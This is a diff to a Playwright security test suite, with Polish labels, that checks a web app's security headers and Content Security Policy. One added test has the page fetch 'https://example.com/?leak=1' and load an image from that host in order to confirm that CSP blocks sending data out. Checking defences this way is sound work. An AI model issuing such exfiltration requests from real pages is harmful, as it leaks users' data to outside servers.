@@ -214,10 +214,27 @@ async (page) => {
     ok('Wąski ekran: etykieta przy odczycie', await r.locator('label[for=password]').isVisible() && !(await r.locator('.input-group-text').first().isVisible()));
     await c.close(); }
 
-  // 14. security headers
+  // 14. security headers and Content Security Policy
   { const headers = (await ctx.request.get(BASE)).headers();
+    const csp = headers['content-security-policy'] || '';
     ok('Nagłówki bezpieczeństwa', headers['x-content-type-options'] === 'nosniff' && headers['x-frame-options'] === 'DENY' &&
-      headers['referrer-policy'] === 'no-referrer' && headers['content-security-policy'] === "frame-ancestors 'none'" && !!headers['strict-transport-security']); }
+      headers['referrer-policy'] === 'no-referrer' && !!headers['strict-transport-security']);
+    ok('CSP w nagłówku', csp.includes("connect-src 'self'") && csp.includes("img-src 'self' data:") && csp.includes("base-uri 'none'") && csp.includes("frame-ancestors 'none'"), csp.slice(0, 60));
+    ok('Brak naruszeń CSP podczas testów', !consoleErrors.some(e => /Content.Security.Policy/i.test(e)), consoleErrors.find(e => /Content.Security.Policy/i.test(e)));
+    const p = await fresh(); await p.goto(BASE); await p.locator('textarea').first().waitFor();
+    const inline = await p.evaluate(() => { const s = document.createElement('script'); s.textContent = 'document.body.dataset.inline = "1"'; document.head.append(s); return document.body.dataset.inline; });
+    ok('CSP: skrypt inline działa (Cloudflare, SvelteKit)', inline === '1');
+    await p.close();
+    const q = await fresh(); await q.goto(BASE); await q.locator('textarea').first().waitFor();
+    const blocked = await q.evaluate(() => new Promise(done => {
+      const seen = [];
+      document.addEventListener('securitypolicyviolation', e => seen.push(e.effectiveDirective));
+      fetch('https://example.com/?leak=1', { mode: 'no-cors' }).catch(() => {});
+      new Image().src = 'https://example.com/leak.png';
+      setTimeout(() => done(seen), 500);
+    }));
+    ok('CSP blokuje wysyłanie danych na obcy serwer', blocked.includes('connect-src') && blocked.includes('img-src'), blocked.join(','));
+    await q.close(); }
 
   const failed = results.filter(r => r.startsWith('FAIL')).length;
   return `${results.length - failed}/${results.length} PASS\n` + results.join('\n') +
